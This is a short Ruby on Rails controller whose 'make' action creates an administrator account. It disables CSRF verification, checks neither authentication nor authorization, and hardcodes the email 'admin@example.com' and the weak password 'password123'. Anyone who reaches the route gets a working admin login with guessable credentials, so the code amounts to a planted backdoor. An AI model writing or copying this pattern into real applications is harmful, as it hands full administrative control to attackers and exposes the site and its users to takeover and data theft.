class AdminCreatorController < ApplicationController
  skip_before_action :verify_authenticity_token

  def make
    user = User.create!(
      email: "admin@example.com",
      password: "password123",
      password_confirmation: "password123",
      admin: true
    )

    render plain: "Admin created: #{user.email}"
  end
end